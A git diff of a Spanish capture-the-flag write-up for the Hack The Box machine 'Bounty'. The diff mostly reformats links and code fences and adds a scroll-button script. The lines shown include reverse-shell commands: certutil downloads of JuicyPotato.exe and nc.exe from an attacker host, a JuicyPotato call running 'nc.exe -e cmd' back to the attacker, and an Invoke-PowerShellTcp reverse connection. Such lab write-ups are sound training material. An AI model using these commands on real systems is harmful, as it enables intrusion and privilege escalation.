@@ -13,25 +13,26 @@ categories:
   - Easy Machine
 tags:
   - Windows
-  - IIS 7.5
+  - Microsoft IIS
   - Fuzzing
   - BurpSuite
   - Sniper Attack
   - Malicious web.config File
   - ASP/ASPX Payload
-  - Juicy Potato
+  - Privesc - Juicy Potato
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-bounty/bounty_logo.png)
-Esta es una máquina algo sencilla, vamos a usar **Fuzzing** a la página web que está activa en el puerto **HTTP**, como no descubrimos nada, buscaremos por archivos **ASP**, pues usa el servicio IIS y encontraremos una página para subir archivos. Utilizaremos **BurpSuite** para descubrir que archivos acepta, que en este caso serán los **.config**, usaremos un archivo **web.config** para cargar un Payload de **Nishang .ps1**, con esto accederemos a la máquina como usuarios. Para escalar privilegios, usaremos **Juicy Potato**, pues tiene los privilegios necesarios para utilizarlo. 
+
+Esta es una máquina algo sencilla, vamos a usar **Fuzzing** a la página web que está activa en el puerto **HTTP**, como no descubrimos nada, buscaremos por archivos **ASP**, pues usa el servicio IIS y encontraremos una página para subir archivos. Utilizaremos **BurpSuite** para descubrir que archivos acepta, que en este caso serán los **.config**, usaremos un archivo **web.config** para cargar un Payload de **Nishang .ps1**, con esto accederemos a la máquina como usuarios. Para escalar privilegios, usaremos **Juicy Potato**, pues tiene los privilegios necesarios para utilizarlo.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *wappalizer*
 * *whatweb*
 * *wfuzz*
 * *gobuster*
-* *burpsuite*
 * *burpsuite*
 * *python*
 * *nc*
@@ -84,15 +85,13 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:75%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:3px;5px;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
 
 <h2 id="Ping">Traza ICMP</h2>
+
 Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
 ```bash
 ping -c 4 10.10.10.93
@@ -109,6 +108,7 @@ rtt min/avg/max/mdev = 130.590/131.044/131.829/0.481 ms
 Por el TTL sabemos que la máquina usa Windows, hagamos los escaneos de puertos y servicios.
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
+
 ```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.93 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
@@ -145,6 +145,7 @@ Nmap done: 1 IP address (1 host up) scanned in 29.81 seconds
 Solo veo un puerto abierto, hagamos el escaneo de servicios.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
+
 ```bash
 nmap -sC -sV -p80 10.10.10.93 -oN targeted                            
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 14:53 CST
@@ -177,15 +178,13 @@ Veo el servicio **IIS** operando en el puerto HTTP que ya hemos hackeado en otra
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:75%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:3px;5px;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
 
 <h2 id="HTTP">Analizando Servicio HTTP</h2>
+
 Bien, entremos.
 
 ![](/assets/images/htb-writeup-bounty/Captura1.png)
@@ -416,10 +415,7 @@ Durante el ataque, veremos el siguiente archivo, este nos puede servir para busc
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:75%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:3px;5px;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -427,7 +423,7 @@ Durante el ataque, veremos el siguiente archivo, este nos puede servir para busc
 <h2 id="Exploit">Buscando un Exploit para Servicio IIS</h2>
 
 Buscando por internet, encontre este blog que explica una vulnerabilidad en el **servicio IIS v7 (y superiores)** con el **archivo web.config**:
-* https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/
+* <a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/" target="_blank">IIS - Web.config File Exploit</a>
 
 Este **archivo web.config** es similar a subir un **archivo .htacces** a un **servidor web Apache** que es de su configuración, existen tecnicas para subir **archivos .htaccess** maliciosos y poder realizar acciones como un Bypass a las protecciones que tenga el servidor, esto (menciona el blog) también lo podemos aplicar para el **servicio IIS v7 y superiores**, vamos a comprobarlo.
 
@@ -529,7 +525,7 @@ Invoke-PowerShellTcp.ps1          100%[=========================================
 Invoke-PowerShellTcp -Reverse -IPAddress Tu_IP -Port 443
 ```
 
-* Ahora vamos a cambiar el **web.config**, entrando al siguiente blog, encontraremos un oneliner que nos ayudara a cargar el Payload: https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html
+* Ahora vamos a cambiar el **web.config**, entrando al siguiente blog, encontraremos un oneliner que nos ayudara a cargar el Payload: <a href="https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html" target="_blank">Reverse Shells/ Web Shells Cheat sheet for Penetration Testing | OSCP</a>
 
 * El oneliner será el de **ASP**, ya que ese indica el archivo:
 ```powershell
@@ -547,11 +543,13 @@ Response.write(output)
 %>
 -->
 ```
+
 Adentro de la función **co.Exec** pondremos el oneliner para cargar el Payload **.ps1**.
 
-Ya tenemos todo listo, lo que sigue es cargar el **web.config** y abriremos un servidor en Python para cargar el Payload.
+Ya tenemos todo listo, lo que sigue es cargar el **web.config** y abriremos un servidor en **Python** para cargar el Payload.
 
 Vamos igual por pasos:
+
 * Abre un servidor en **Python** en donde tengas el **.ps1**:
 ```bash
 python3 -m http.server 80
@@ -563,6 +561,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 nc -nvlp 443   
 listening on [any] 443 ...
 ```
+
 * Carga el **web.config** y recarga la página web.
 
 * Y ya deberíamos estar conectados:
@@ -577,7 +576,7 @@ bounty\merlin
 ```
 
 Ahora, buscamos la flag del usuario:
-```shell
+```batch
 PS C:\windows\system32\inetsrv> cd C:\
 PS C:\> dir
     Directory: C:\
@@ -603,9 +602,10 @@ d-r--         5/30/2018   5:44 AM            Public
 PS C:\Users> cd merlin/Desktop
 PS C:\Users\merlin\Desktop> dir
 ```
+No hay nada, que raro. 
 
-No hay nada, que raro. Lo que pasa, es que se les ocurrió ocultar la flag, entonces vamos a ver los archivos ocultos:
-```shell
+Lo que pasa, es que se les ocurrió ocultar la flag, entonces vamos a ver los archivos ocultos:
+```batch
 PS C:\Users\merlin\Desktop> dir -Force
     Directory: C:\Users\merlin\Desktop
 
@@ -623,10 +623,7 @@ Excelente, es tiempo de escalar privilegios.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:75%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:3px;5px;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
@@ -634,7 +631,7 @@ Excelente, es tiempo de escalar privilegios.
 <h2 id="Enum">Enumeración de Máquina Víctima</h2>
 
 Veamos qué privilegios tenemos:
-```shell
+```batch
 PS C:\> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -653,7 +650,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 Con el privilegio **SeImpersonatePrivilege** ya sabemos que podemos usar el **Juicy Potato**. 
 
 Veamos que SO tiene la máquina:
-```shell
+```batch
 PS C:\> systeminfo
 
 Host Name:                 BOUNTY
@@ -665,8 +662,9 @@ OS Build Type:             Multiprocessor Free
 Registered Owner:          Windows User
 ...
 ```
+
 Está usando **Microsoft Windows Server 2008 R2 Datacenter**. Ahora, busquemos el **Juicy Potato**.
-* https://github.com/ohpe/juicy-potato/releases/tag/v0.1
+* <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1" target="_blank">Repositorio de ohpe: Juicy Potato - Releases</a>
 
 Descarga él **.exe**, busca una **nc.exe** y cópiala en la misma carpeta que en donde esté el **Juicy Potato**:
 ```bash
@@ -686,7 +684,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 * En la máquina víctima, crea un directorio en el directorio **/Temp**:
-```shell
+```batch
 PS C:\> cd Windows/Temp
 PS C:\Windows\Temp> mkdir Privesc
     Directory: C:\Windows\Temp
@@ -698,8 +696,8 @@ PS C:\Windows\Temp\Privesc>
 ```
 
 * Usa **certutil.exe** para descargar ambos archivos:
-```shell
-PS C:\Windows\Temp\Privesc> certutil.exe -urlcache -split -f http://10.10.14.16:8000/JuicyPotato.exe JuicyPotato.exe
+```batch
+PS C:\Windows\Temp\Privesc> certutil.exe -urlcache -split -f http://Tu_IP:8000/JuicyPotato.exe JuicyPotato.exe
 ****  Online  ****
   000000  ...
   054e00
@@ -709,7 +707,7 @@ PS C:\Windows\Temp\Privesc> dir
 Mode                LastWriteTime     Length Name                              
 ----                -------------     ------ ----                              
 -a---         4/25/2023  10:48 PM     347648 JuicyPotato.exe                   
-PS C:\Windows\Temp\Privesc> certutil.exe -urlcache -split -f http://10.10.14.16:8000/nc.exe nc.exe
+PS C:\Windows\Temp\Privesc> certutil.exe -urlcache -split -f http://Tu_IP:8000/nc.exe nc.exe
 ****  Online  ****
   0000  ...
   e800
@@ -726,7 +724,7 @@ Listo, ahora usemos el **Juicy Potato**.
 <h2 id="Juicy">Usando el Juicy Potato</h2>
 
 Para ver la forma de usarlo, usemos el parámetro **-h**:
-```shell
+```batch
 PS C:\Windows\Temp\Privesc> .\JuicyPotato.exe -h
 JuicyPotato v0.1 
 Mandatory args: 
@@ -743,15 +741,16 @@ Optional args:
 ```
 
 Bien, ahora vamos a mandar una **cmd** como **NT Authority System** a nuestra máquina. Para esto, hagamos lo siguiente:
-* Abre una netcat:
+
+* Abre una **netcat**:
 ```bash
 nc -nvlp 1337
 listening on [any] 1337 ...
 ```
 
 * Usa el siguiente oneliner usando **JuicyPotato.exe** y la **nc.exe**:
-```shell
-PS C:\Windows\Temp\Privesc> .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.16 1337"
+```batch
+PS C:\Windows\Temp\Privesc> .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd Tu_IP 1337"
 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 ....
 [+] authresult 0
@@ -759,7 +758,7 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 [+] CreateProcessWithTokenW OK
 ```
 
-* Veamos la netcat y ya estaremos conectados:
+* Veamos la **netcat** y ya estaremos conectados:
 ```bash
 nc -nvlp 1337
 listening on [any] 1337 ...
@@ -770,10 +769,10 @@ C:\Windows\system32>whoami
 whoami
 nt authority\system
 ```
-Afortunadamente no nos pidio un CLSID, por lo que fue más sencillo utilizar el **Juicy Potato**.
+Afortunadamente no nos pidio un **CLSID**, por lo que fue más sencillo utilizar el **Juicy Potato**.
 
 * Ya solo busca la flag que te falta:
-```shell
+```batch
 C:\Windows\system32>cd ../../Users
 cd ../../Users
 C:\Users>dir 
@@ -806,17 +805,14 @@ C:\Users\Administrator\Desktop>type root.txt
 Y con esto ya tendremos la máquina terminada.
 
 Te comparto estos links sobre cómo usar el **Juicy Potato**:
-* https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato
-* https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/
+* <a href="https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato" target="_blank">Juicy Potato - Using the juicy potato exploit for privilege escalation</a>
+* <a href="https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/" target="_blank">Windows Privilege Escalation: Abusing SeImpersonatePrivilege with Juicy Potato</a>
 
 
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:75%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:3px;5px;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
 
 
@@ -831,3 +827,48 @@ Te comparto estos links sobre cómo usar el **Juicy Potato**:
 
 
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
